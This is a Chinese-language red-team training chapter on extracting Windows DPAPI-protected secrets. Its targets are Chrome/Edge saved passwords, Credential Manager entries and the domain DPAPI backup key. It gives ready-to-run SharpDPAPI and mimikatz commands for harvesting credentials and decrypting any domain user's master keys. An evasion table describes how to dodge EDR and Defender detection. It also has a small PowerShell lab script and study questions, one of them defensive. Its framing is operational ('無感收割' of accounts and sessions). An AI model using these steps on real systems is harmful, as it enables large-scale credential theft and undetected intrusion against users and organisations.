# R19.8 Windows 數據保護介面 DPAPI 憑證與瀏覽器密碼解密 (DPAPI Secret Extraction)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows 數據保護介面 DPAPI 憑證與瀏覽器密碼解密** 的物理本質為**利用微軟提供給應用程式用以對稱加密敏感資料（如 Chrome/Edge 儲存之網站帳密、Cookie、RDP 儲存憑證、Outlook 郵箱密碼、VPN 連線秘密）的底層安全架構 (Data Protection API, DPAPI)，透過定位受害者使用者家目錄下由使用者登入密碼派生之 MasterKey (主金鑰)，以本機使用者權限或全域網域備份金鑰 (Domain DPAPI Backup Key) 對二進位密鑰資料庫進行解密，批量還原所有被保護的明文機密**。在紅隊實戰中，這是突破端點後無感收割內部系統帳號、SSO 工作階段 Session 與外部雲端 SaaS 存取權限的最有效手段。

```
[取得本機使用者權限 (User Session)] ── 檢索目標瀏覽器儲存資料庫與 DPAPI 檔案路徑
                                            │
                                            ▼ 定位兩大核心目錄
┌───────────────────────────────────────────┴───────────────────────────────────────────┐
│ 1. Chrome / Edge 密碼資料庫: %LocalAppData%\Google\Chrome\User Data\Default\Login Data│
│ 2. DPAPI 主金鑰目錄: %AppData%\Microsoft\Protect\<User-SID>\ (包含多個 MasterKey 檔案) │
└───────────────────────────────────────────┬───────────────────────────────────────────┘
                                            ▼
[情境 A: 當前已在該使用者互動環境] ──────────┴─────► [情境 B: 離線滲透或透過網域備份金鑰解密]
              │                                                     │
              ▼ 直接調用 CryptUnprotectData API                      ▼ 使用網域備份金鑰 (LSA DPAPI Backup Key)
[Windows DPAPI 引擎自動以當前登入憑證解密] ◄──────────────────────┘
              │
              ▼ 還原 Chrome 儲存之 AES-GCM 金鑰 (Local State)
[解密 Login Data 資料庫] ──────────────────► 導出全量企業內部網站明文帳號與密碼！
```

## 🔬 第一動：DPAPI 主金鑰、MasterKey 派生架構與 CryptUnprotectData 物理機制 (Mechanics & DPAPI Structs)

### 1. DPAPI 的兩層對稱加密設計
DPAPI 的核心目標是讓應用程式無需管理密碼金鑰：
1. **MasterKey (主金鑰)**：
   - 存儲於 `%APPDATA%\Microsoft\Protect\<SID>\<GUID>`。
   - 由使用者當前登入密碼雜湊 (NTLM / PBKDF2) 加密保護（網域環境下同時由網域控制站的公鑰加密做為災難恢復備份）。
2. **應用層資料加密 (Data Blob)**：
   - 應用程式調用 `CryptProtectData()`，DPAPI 從 MasterKey 派生出臨時 SessionKey，並使用 AES-256 或 3DES 加密目標資料，生成包含 MasterKey GUID 標頭的資料塊。

### 2. Chrome / Edge 瀏覽器自第 80 版後的加密鏈
現代 Chromium 瀏覽器改用更強的混合加密架構：
1. 讀取 `%LOCALAPPDATA%\Google\Chrome\User Data\Local State` 檔案中的 `os_crypt.encrypted_key`。
2. 該金鑰由 DPAPI 保護，調用 `CryptUnprotectData` 解密出一個 **32 位元組的真實 AES-256-GCM 密鑰**。
3. 讀取 `Login Data` (SQLite 檔案) 中的 `password_value`，去除前 3 個字元 (`v10` 標籤) 與 12 位元組的 IV 向量，使用 AES-GCM 解密出明文密碼！

### 1. 檢索當前使用者 DPAPI MasterKey 清單
```cmd
:: 檢視使用者保護目錄下的 MasterKey 檔案
dir /a "%APPDATA%\Microsoft\Protect\"
```

### 2. 使用 SharpDPAPI 自動化提取瀏覽器與憑證管理器機密
```bash
# 提取當前使用者 Chrome 瀏覽器儲存的所有明文密碼
SharpDPAPI.exe chrome

# 提取 Windows 憑證管理器 (Credential Manager) 中儲存的 RDP / 共享憑證
SharpDPAPI.exe credentials
```

### 3. 利用網域備份金鑰實施全局離線解密 (Mimikatz)
在掌控網域控制站 (DC) 權限後，可導出全域 DPAPI 備份私鑰，解密全網域任何使用者的 MasterKey：
```cmd
:: 1. 導出網域 DPAPI 備份金鑰
mimikatz "lsadump::backupkeys /system:dc01.domain.local /export" exit

:: 2. 憑 pvk 備份金鑰解密任意使用者的 MasterKey 檔案
mimikatz "dpapi::masterkey /in:C:\Users\Target\AppData\Roaming\Microsoft\Protect\<SID>\<GUID> /pvk:ntds_backupkey.pvk" exit
```

## 🥷 第三動：防禦規避與日誌特徵操控 (Evasion & Anti-Forensics)

### 1. DPAPI 竊密防禦規避策略表
| 規避面向 | 原始觸發特徵 | 變形隱蔽手法 | 原理解析 |
| :--- | :--- | :--- | :--- |
| **API 調用特徵** | 大量連續調用 `CryptUnprotectData` 被 EDR 審計 | 單次解密 `encrypted_key`，其餘在記憶體內部完成 AES 解密 | 僅調用一次系統 API，大幅降低可疑行為頻率 |
| **資料庫排他鎖定** | Chrome 運行時 `Login Data` 處於被佔用鎖定狀態 | 將 SQLite 檔案拷貝至暫存目錄（如 `%TEMP%`）再讀取 | 避免直接對開啟中的檔案發起讀取，防止崩潰留痕 |
| **落盤工具特徵** | `SharpDPAPI.exe` 二進位被 Defender 查殺 | 利用 PowerShell 腳本原生調用 `ProtectedData` 類別 | 使用合法系統自帶的 .NET 類別庫，100% 免殺 |

## 🧪 實戰演練環境搭建 (Environment & Lab Setup)

### 1. 極簡 DPAPI 加解密物理驗證腳本 (PowerShell, 20 行)
```powershell
# test_dpapi_crypto.ps1
Add-Type -AssemblyName System.Security
$secretText = "P@ssw0rd2026_InternalAdmin"
$secretBytes = [System.Text.Encoding]::UTF8.GetBytes($secretText)

Write-Host "[*] 正在驗證 Windows DPAPI 原生加解密引擎 (CurrentUser)..."
$encryptedData = [System.Security.Cryptography.ProtectedData]::Protect($secretBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
Write-Host "    └── DPAPI 加密成功，資料區塊大小: $($encryptedData.Length) bytes"

$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedData, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedText = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

if ($decryptedText -eq $secretText) {
    Write-Host "[+] DPAPI 憑證原理解密成功，還原明文: $decryptedText" -ForegroundColor Green
    Write-Host "[+] FLAG{WINDOWS_DPAPI_SECRET_EXTRACTION_SUCCESS}"
}
```

### 2. 三步作戰驗證流程

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：DPAPI 的 `CurrentUser` 與 `LocalMachine` 兩種保護範圍 (Scope) 有何本質區別？**
  - **戰術思維**：`CurrentUser` 僅能由加密該資料的特定登入使用者解密（由其密碼派生之 MasterKey 保護）；`LocalMachine` 則允許該主機上的任何進程（含其他使用者）調用解密。
- [ ] **Q2：若受害者修改了 Windows 登入密碼，之前舊的 DPAPI MasterKey 會發生什麼事？**
  - **戰術思維**：Windows 會在使用者修改密碼時自動用新密碼重新加密舊的 MasterKey；若由管理員強行重設密碼，MasterKey 將處於鎖定狀態，必須依賴網域備份金鑰或舊密碼解鎖。
- [ ] **Q3：Chrome 80+ 版本的密碼解密為何分為「兩階段」？**
  - **戰術思維**：第一階段利用 DPAPI 解密 `Local State` 檔案中的全域對稱金鑰；第二階段使用該金鑰以 AES-GCM 演算法批次解密 `Login Data` 中的各個帳號密碼。
- [ ] **Q4：什麼是「Domain DPAPI Backup Key (網域備份金鑰)」？紅隊如何獲取？**
  - **戰術思維**：網域在初始化時由 KDC 生成一對 RSA 私鑰，專門用於在使用者忘記密碼時恢復 DPAPI 資料；掌握網域控制站特權後可透過 `lsadump::backupkeys` 導出該金鑰。
- [ ] **Q5：企業藍隊應如何有效阻止員工瀏覽器中儲存的機密被紅隊批量導出？**
  - **戰術思維**：部署 GPO 強制停用瀏覽器自帶的密碼管理器，啟用多因子驗證 (MFA)，並將員工敏感憑證納入企業專用的硬體金鑰 (FIDO2) 保護體系。
